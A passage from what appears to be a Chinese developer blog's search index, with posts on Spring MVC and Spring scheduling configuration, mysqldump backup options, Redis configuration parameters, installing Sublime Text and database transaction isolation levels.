    <content type="text"><![CDATA[Springmvc 基础配置大神请绕道。不涉及到数据库的事务，或整合其他的框架，只需要几个基础包就可以了。如下图： 第一个配置方法：springmvc.xml 文件123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.0.xsd&quot;&gt; &lt;mvc:annotation-driven/&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!-- 配置自定扫描的包 --&gt; &lt;context:component-scan base-package=&quot;top.lrshuai.springmvc&quot;&gt;&lt;/context:component-scan&gt; &lt;!-- 配置视图解析器: 如何把 handler 方法返回值解析为实际的物理视图 --&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;&gt;&lt;/property&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; 注意的是springmvc.xml 文件要放在WEB-INF 下。不然会报文件找不到。 web.xml 文件123456789101112131415161718192021222324252627282930&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt; &lt;!-- 配置 SpringMVC --&gt; &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;!-- 配置 DispatcherServlet 的一个初始化参数: 配置 SpringMVC 配置文件的位置和名称 --&gt; &lt;!-- 实际上也可以不通过 contextConfigLocation 来配置 SpringMVC 的配置文件, 而使用默认的. 默认的配置文件为: /WEB-INF/&lt;servlet-name&gt;-servlet.xml --&gt; &lt;!-- &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; --&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;/web-app&gt; 第二个配置方法： springmvc.xml 可以不放在WEB-INF 下面，放在src目录下的话要修改web.xml文件，修改如下： web.xml1234567891011121314151617181920212223242526272829303132&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt; &lt;display-name&gt;gdinterface&lt;/display-name&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.html&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;servlet&gt; &lt;servlet-name&gt;springMvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;!-- 修改的地方在这 --&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springMvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/404.jsp&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;500&lt;/error-code&gt; &lt;location&gt;/500.jsp&lt;/location&gt; &lt;/error-page&gt;&lt;/web-app&gt; 第三种配置方法： 如果要整合其他的框架，一般是分为两个配置文件的。需要注意的是，扫描包的时候可能会导致bean被创建了两次。所有可以使用 exclude-filter 和 include-filter 子节点来规定只能扫描的注解。 springmvc.xml1234567891011121314151617181920212223242526&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.0.xsd&quot;&gt; &lt;mvc:annotation-driven/&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!-- 配置自定扫描的包 --&gt; &lt;context:component-scan base-package=&quot;top.lrshuai.springmvc&quot; use-default-filters=&quot;false&quot;&gt; &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Controller&quot;/&gt; &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;/&gt; &lt;/context:component-scan&gt; &lt;!-- 配置视图解析器: 如何把 handler 方法返回值解析为实际的物理视图 --&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;&gt;&lt;/property&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; 整合其他框架的配置文件，就把它叫做 bean.xml,内容如下： bean.xml1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;&gt; &lt;context:component-scan base-package=&quot;top.lrshuai.springmvc&quot;&gt; &lt;context:exclude-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Controller&quot;/&gt; &lt;context:exclude-filter type=&quot;annotation&quot; expression=&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;/&gt; &lt;/context:component-scan&gt; &lt;!-- 配置数据源, 整合其他框架, 事务等. --&gt; &lt;/beans&gt; web.xml 要修改12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt; &lt;!-- 配置启动 Spring IOC 容器的 Listener --&gt; &lt;!-- needed for ContextLoaderListener --&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:beans.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!-- Bootstraps the root web application context before servlet initialization --&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;servlet&gt; &lt;servlet-name&gt;Springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;Springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;/web-app&gt; 需要注意的是 springmvc.xml 和 bean.xml 要放在src目录下]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring 定时任务]]></title>
    <url>%2Fblog%2F2017%2F07%2F06%2FSpring%20%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Spring 或springboot 定时任务1、demo 代码示例123456789101112package top.lrshuai.task; import org.springframework.scheduling.annotation.Scheduled;import org.springframework.stereotype.Component; @Componentpublic class TimeTask&#123; @Scheduled(cron = &quot;0 0 0 ? * MON&quot;) public void timeTask() &#123; System.out.println(&quot;定时任务&quot;); &#125; &#125; cron：指定cron表达式。我上面写的是每周一0点执行 2、配置问题(1)、spring 配置 配置文件的代码片段,主要是添加最下面两行 123456789101112131415161718192021222324&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:task=&quot;http://www.springframework.org/schema/task&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/task http://www.springframework.org/schema/task/spring-task-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=&quot;top.rstyro&quot;/&gt; &lt;!-- 定时任务配置 --&gt; &lt;task:annotation-driven scheduler=&quot;qbScheduler&quot; mode=&quot;proxy&quot; /&gt; &lt;task:scheduler id=&quot;qbScheduler&quot; pool-size=&quot;10&quot; /&gt; (2)、springboot这个比较简单，在Spring Boot的主类中加入@ EnableScheduling注解，启用定时任务的配置123456789@SpringBootApplication@MapperScan(&quot;top.lrshuai.blog.dao&quot;)@EnableSchedulingpublic class Application &#123; public static void main(String[] args) &#123; SpringApplication.run(Application.class, args); &#125;&#125; 3、参数解析关于cronExpression的介绍: 字段 允许值 允许的特殊字符秒 0-59 , - /分 0-59 , - /小时 0-23 , - /日期 1-31 , - ? / L W C月份 1-12 或者 JAN-DEC , - /星期 1-7 或者 SUN-SAT , - ? / L C #年（可选） 留空, 1970-2099 , - * / 表达式意义 表达式 含义 0 0 12 * * ? 每天中午12点触发 0 15 10 ? * * 每天上午10:15触发 0 15 10 * * ? 每天上午10:15触发 0 15 10 * * ? * 每天上午10:15触发 0 15 10 * * ? 2005 2005年的每天上午10:15触发 0 * 14 * * ? 在每天下午2点到下午2:59期间的每1分钟触发 0 0/5 14 * * ? 在每天下午2点到下午2:55期间的每5分钟触发 0 0/5 14,18 * * ? 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发 0 0-5 14 * * ? 在每天下午2点到下午2:05期间的每1分钟触发 0 10,44 14 ? 3 WED 每年三月的星期三的下午2:10和2:44触发 0 15 10 ? * MON-FRI 周一至周五的上午10:15触发 0 15 10 15 * ? 每月15日上午10:15触发 0 15 10 L * ? 每月最后一日的上午10:15触发 0 15 10 ? * 6L 每月的最后一个星期五上午10:15触发 0 15 10 ? * 6L 2002-2005 2002年至2005年的每月的最后一个星期五上午10:15触发 0 15 10 ? * 6#3 每月的第三个星期五上午10:15触发 0 6 * * * 每天早上6点 0 */2 * * * 每两个小时 0 0/5 * * * ? 每5分钟 0 23-7/2，8 * * * 晚上11点到早上8点之间每两个小时，早上八点 0 11 4 * 1-3 每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点 0 4 1 1 * 1月1日早上4点]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysqldump数据库备份,参数详解]]></title>
    <url>%2Fblog%2F2017%2F07%2F03%2Fmysqldump%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%2C%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、 mysqldump是mysql用于转存储数据库的实用程序。它主要产生一个SQL脚本，其中包含从头重新创建数据库所必需的命令CREATE TABLE INSERT等。1、导出数据库为dbname所有表结构及表数据12mysqldump -u root -pdbpasswd dbname &gt; db.sql //密码为dbpasswd,注意的是-p后面不能加空格,db.sql就是生成的脚本，可以改成你要生成的文件mysqldump -u root -p dbname &gt; db.sql//回车的时候再输入密码 2、导出数据库为dbname某张表(test)结构及表数据12# 如果只想导表结构而不要数据则，不加参数 -dmysqldump -uroot -pdbpasswd dbname test &gt; db.sql 3、导出数据库为dbname的表结构1mysqldump -uroot -pdbpasswd -d dbname &gt;db.sql 4、导出数据库为dbname某张表(test)结构1mysqldump -uroot -pdbpasswd -d dbname test&gt;db.sql 5、如果要备份某个MySQL主机上的所有数据库可以使用–all-databases选项，如下：1mysqldump -uroot -p --all-databases &gt; test.dump 二、DEMO 如下： 出现一个警告是说把密码放在命令行会不安全，但文件还是保存下来了 三、导入文件有导入命令，那是不是也有导入命令呢？那是肯定的,命令如下1、shell 命令导入1mysql -u root -p dbname &lt; db.sql 2、在mysql 中导入12use dbname;source db.sql 四、下面介绍mysqldump 的其他参数–all-tablespaces , -Y导出全部表空间。1mysqldump -uroot -p --all-databases --all-tablespaces &gt; db.sql –no-tablespaces , -y不导出任何表空间信息。1mysqldump -uroot -p --all-databases --no-tablespaces &gt; db.sql –add-drop-database每个数据库创建之前添加drop数据库语句。1mysqldump -uroot -p --all-databases --add-drop-database &gt; db.sql –add-drop-table每个数据表创建之前添加drop数据表语句。(默认为打开状态，使用–skip-add-drop-table取消选项)12mysqldump -uroot -p --all-databases &gt; db.sql (默认添加drop语句)mysqldump -uroot -p --all-databases –skip-add-drop-table &gt; db.sql (取消drop语句) –add-locks在每个表导出之前增加LOCK TABLES并且之后UNLOCK TABLE。(默认为打开状态，使用–skip-add-locks取消选项)12mysqldump -uroot -p --all-databases &gt; db.sql (默认添加LOCK语句)mysqldump -uroot -p --all-databases –skip-add-locks &gt; db.sql (取消LOCK语句) –allow-keywords允许创建是关键词的列名字。这由表名前缀于每个列名做到。1mysqldump -uroot -p --all-databases --allow-keywords &gt; db.sql –apply-slave-statements在’CHANGE MASTER’前添加’STOP SLAVE’，并且在导出的最后添加’START SLAVE’。1mysqldump -uroot -p --all-databases --apply-slave-statements &gt; db.sql –character-sets-dir字符集文件的目录1mysqldump -uroot -p --all-databases --character-sets-dir=/usr/local/mysql/share/mysql/charsets &gt; db.sql –comments附加注释信息。默认为打开，可以用–skip-comments取消12mysqldump -uroot -p --all-databases &gt; db.sql (默认记录注释)mysqldump -uroot -p --all-databases --skip-comments &gt; db.sql (取消注释) –compatible导出的数据将和其它数据库或旧版本的MySQL 相兼容。值可以为ansi、mysql323、mysql40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options、no_field_options等，要使用几个值，用逗号将它们隔开。它并不保证能完全兼容，而是尽量兼容。1mysqldump -uroot -p --all-databases --compatible=ansi &gt; db.sql –compact导出更少的输出信息(用于调试)。去掉注释和头尾等结构。可以使用选项：–skip-add-drop-table –skip-add-locks –skip-comments –skip-disable-keys1mysqldump -uroot -p --all-databases --compact &gt; db.sql –complete-insert, -c使用完整的insert语句(包含列名称)。这么做能提高插入效率，但是可能会受到max_allowed_packet参数的影响而导致插入失败。1mysqldump -uroot -p --all-databases --complete-insert &gt; db.sql –compress, -C在客户端和服务器之间启用压缩传递所有信息1mysqldump -uroot -p --all-databases --compress –create-options, -a在CREATE TABLE语句中包括所有MySQL特性选项。(默认为打开状态)1mysqldump -uroot -p --all-databases &gt; db.sql –databases, -B导出几个数据库。参数后面所有名字参量都被看作数据库名。1mysqldump -uroot -p --databases test mysql &gt; db.sql -debug输出debug信息，用于调试。默认值为：d:t:o,/tmp/mysqldump.trace12mysqldump -uroot -p --all-databases --debug &gt; db.sqlmysqldump -uroot -p --all-databases --debug=” d:t:o,/tmp/debug.trace” &gt; db.sql -#### -debug-check 检查内存和打开文件使用说明并退出。1mysqldump -uroot -p --all-databases --debug-check &gt; db.sql –debug-info输出调试信息并退出1mysqldump -uroot -p --all-databases --debug-info &gt; db.sql –default-character-set设置默认字符集，默认值为utf81mysqldump -uroot -p --all-databases --default-character-set=latin1 &gt; db.sql –delayed-insert采用延时插入方式（INSERT DELAYED）导出数据1mysqldump -uroot -p --all-databases --delayed-insert &gt; db.sql –delete-master-logsmaster备份后删除日志. 这个参数将自动激活–master-data。1mysqldump -uroot -p --all-databases --delete-master-logs &gt; db.sql –disable-keys对于每个表，用/!40000 ALTER TABLE tbl_name DISABLE KEYS /;和/!40000 ALTER TABLE tbl_name ENABLE KEYS /;语句引用INSERT语句。这样可以更快地导入dump出来的文件，因为它是在插入所有行后创建索引的。该选项只适合MyISAM表，默认为打开状态。1mysqldump -uroot -p --all-databases &gt; db.sql –dump-slave该选项将导致主的binlog位置和文件名追加到导出数据的文件中。设置为1时，将会以CHANGE MASTER命令输出到数据文件；设置为2时，在命令前增加说明信息。该选项将会打开–lock-all-tables，除非–single-transaction被指定。该选项会自动关闭–lock-tables选项。默认值为0。12mysqldump -uroot -p --all-databases --dump-slave=1 &gt; db.sqlmysqldump -uroot -p --all-databases --dump-slave=2 &gt; db.sql –events, -E导出事件。1mysqldump -uroot -p --all-databases --events &gt; db.sql –extended-insert, -e使用具有多个VALUES列的INSERT语法。这样使导出文件更小，并加速导入时的速度。默认为打开状态，使用–skip-extended-insert取消选项。12mysqldump -uroot -p --all-databases &gt; db.sqlmysqldump -uroot -p --all-databases--skip-extended-insert &gt; db.sql (取消选项) –fields-terminated-by导出文件中忽略给定字段。与–tab选项一起使用，不能用于–databases和–all-databases选项1mysqldump -uroot -p test test --tab=”/home/mysql” --fields-terminated-by=”#” &gt; db.sql –fields-enclosed-by输出文件中的各个字段用给定字符包裹。与–tab选项一起使用，不能用于–databases和–all-databases选项1mysqldump -uroot -p test test --tab=”/home/mysql” --fields-enclosed-by=”#” &gt; db.sql –fields-optionally-enclosed-by输出文件中的各个字段用给定字符选择性包裹。与–tab选项一起使用，不能用于–databases和–all-databases选项1mysqldump -uroot -p test test --tab=”/home/mysql” --fields-enclosed-by=”#” --fields-optionally-enclosed-by =”#” &gt; db.sql –fields-escaped-by输出文件中的各个字段忽略给定字符。与–tab选项一起使用，不能用于–databases和–all-databases选项1mysqldump -uroot -p mysql user --tab=”/home/mysql” --fields-escaped-by=”#” &gt; db.sql –flush-logs开始导出之前刷新日志。请注意：假如一次导出多个数据库(使用选项–databases或者–all-databases)，将会逐个数据库刷新日志。除使用–lock-all-tables或者–master-data外。在这种情况下，日志将会被刷新一次，相应的所以表同时被锁定。因此，如果打算同时导出和刷新日志应该使用–lock-all-tables 或者–master-data 和–flush-logs。1mysqldump -uroot -p --all-databases --flush-logs &gt; db.sql –flush-privileges在导出mysql数据库之后，发出一条FLUSH PRIVILEGES 语句。为了正确恢复，该选项应该用于导出mysql数据库和依赖mysql数据库数据的任何时候。1mysqldump -uroot -p --all-databases --flush-privileges &gt; db.sql –force在导出过程中忽略出现的SQL错误。1mysqldump -uroot -p --all-databases --force &gt; db.sql –host, -h需要导出的主机信息1mysqldump -uroot -p --host=localhost --all-databases &gt; db.sql 还有一些应该不算太常用，就不写了]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis 配置文件参数说明]]></title>
    <url>%2Fblog%2F2017%2F07%2F01%2FRedis%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[Redis 配置文件参数说明：1. Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程 daemonize no 2. 当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定 pidfile /var/run/redis.pid 3. 指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字 port 6379 4. 绑定的主机地址 bind 127.0.0.1 5.当 客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能 timeout 300 6. 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose loglevel verbose 7. 日志记录方式，默认为标准输出，如果配置Redis为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给/dev/null logfile stdout 8. 设置数据库的数量，默认数据库为0，可以使用SELECT 命令在连接上指定数据库id databases 16 9. 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合 save Redis默认配置文件中提供了三个条件：save 900 1save 300 10save 60 10000分别表示900秒（15分钟）内有1个更改，300秒（5分钟）内有10个更改以及60秒内有10000个更改。 10. 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大 rdbcompression yes 11. 指定本地数据库文件名，默认值为dump.rdb dbfilename dump.rdb 12. 指定本地数据库存放目录 dir ./ 13. 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步 slaveof 14. 当master服务设置了密码保护时，slav服务连接master的密码 masterauth 15. 设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH 命令提供密码，默认关闭 requirepass foobared 16. 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息 maxclients 128 17. 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，当此方法处理 后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis新的vm机制，会把Key存放内存，Value会存放在swap区 maxmemory 18. 指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no appendonly no 19. 指定更新日志文件名，默认为appendonly.aof appendfilename appendonly.aof 20. 指定更新日志条件，共有3个可选值： no：表示等操作系统进行数据缓存同步到磁盘（快）always：表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全）everysec：表示每秒同步一次（折衷，默认值）appendfsync everysec 21. 指定是否启用虚拟内存机制，默认值为no，简单的介绍一下，VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中（在后面的文章我会仔细分析Redis的VM机制） vm-enabled no 22. 虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享 vm-swap-file /tmp/redis.swap 23. 将所有大于vm-max-memory的数据存入虚拟内存,无论vm-max-memory设置多小,所有索引数据都是内存存储的(Redis的索引数据 就是keys),也就是说,当vm-max-memory设置为0的时候,其实是所有value都存在于磁盘。默认值为0 vm-max-memory 0 24. Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的 数据大小来设定的，作者建议如果存储很多小对象，page大小最好设置为32或者64bytes；如果存储很大大对象，则可以使用更大的page，如果不 确定，就使用默认值 vm-page-size 32 25. 设置swap文件中的page数量，由于页表（一种表示页面空闲或使用的bitmap）是在放在内存中的，，在磁盘上每8个pages将消耗1byte的内存。 vm-pages 134217728 26. 设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4 vm-max-threads 4 27. 设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启 glueoutputbuf yes 28. 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法 hash-max-zipmap-entries 64hash-max-zipmap-value 512 29. 指定是否激活重置哈希，默认为开启（后面在介绍Redis的哈希算法时具体介绍） activerehashing yes 30. 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件 include /path/to/local.conf]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装sublime]]></title>
    <url>%2Fblog%2F2017%2F06%2F19%2F%E5%AE%89%E8%A3%85sublime%2F</url>
    <content type="text"><![CDATA[安装sublime1、下载安装包官网：https://www.sublimetext.com/32、安装傻瓜式安装没啥好说3、安装插件 package control(1)、百度搜索 pageage control 进入官网：https://packagecontrol.io/installation 下载(2)、打开sublime-&gt;Preferences-&gt;Browse packages. 会打开如下图的文件夹，点击箭头指示 (3)、然后进入 Installed Packages 文件夹，把刚才下载的插件 package control拷贝进去，重新打开sublime,按快捷键 ctrl+shift+p 在命令面板中输入pcip(4)、安装第一个 如图： (5)、打开控制面板 输入 install 回车，显示如下，在输入框中输入要装的插件，如下图所示： sublime 不装插件没什么特色，装了插件才好玩 4、推荐插件如下：1.html5 支持hmtl5规范的插件包 2.jQuery 支持JQuery规范的插件包 3.Alignment 代码对齐，选中这几行，Ctrl+Alt+A，齐了。 4.ColorPicker 编辑CSS样式的时候，更可以轻松调好颜色,使用一个取色器.改变颜色快捷键：ctrl+shift+c 5.Emmet Emmet （前身是 Zen Coding）是一个前端开发不可缺少的插件，它让编写 HTML和CSS代码变得简单，节省大量时间。Emmet可使开发者用缩写形式书写代码，再用“扩展”功能自动将代码扩展至完整样式。 6.Autoprefixer CSS3 私有前缀自动补全插件，显然也很有用哇 7.HTML-CSS-JS Prettify 使用说明：快速格式化html css js快捷键：ctrl+shift+h]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>开发工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库事务]]></title>
    <url>%2Fblog%2F2017%2F06%2F19%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%8B%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[事务1、什么是事务在数据库中,所谓事务是指一组逻辑操作单元,使数据从一种状态变换到另一种状态。为确保数据库中数据的一致性,数据的操纵应当是离散的成组的逻辑单元:当它全部完成时,数据的一致性可以保持,而当这个单元中的一部分操作失败,整个事务应全部视为错误,所有从起始点以后的操作应全部回退到开始状态 2、事务的ACID(acid)属性 原子性（Atomicity）原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。 一致性（Consistency）事务必须使数据库从一个一致性状态变换到另外一个一致性状态。 隔离性（Isolation）事务的隔离性是指一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。 持久性（Durability）持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据库故障不应该对其有任何影响 3、并发可能产生的问题 脏读:一个事务读取另外一个事务尚未提交的数据 不可重复读:其他事务的操作导致某个事务两次读取数据不一致 不可重复读,针对已经提交的数据。2.两次或多次读取同一条数据 幻读:其他事务的数据操作导致某个事务两次读取数据数量不一致。例如：对于两个事物 T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行. 之后, 如果 T1 再次读取同一个表, 就会多出几行. 幻读针对已经提交的数据。2.两次或多次读取不同行数据，数量上新增或减少 4、事务的隔离级别 隔离级别 描述说明 none 无事务 READ_UNCOMMITTED（读未提交数据） 脏读、不可重复读、幻读，3种情况都可能会发生 READ_COMMITTED（读已提交） 只允许读取已提交的数据，既不可能发生脏读，有可能发生不可重复读和幻读 REPEATABLE_READ（可重复读） 确保事务可以多次从一个字段读取相同的值，在这个事务持续期间，禁止其他事务对这个字段的更新。所以可以避免脏读和不可重复读，但幻读还是可能发生 SERIALIZABLE（直译为串行事务） 保证不读脏，可重复读，不可幻读，事务隔离级别最高 慢慢更新]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
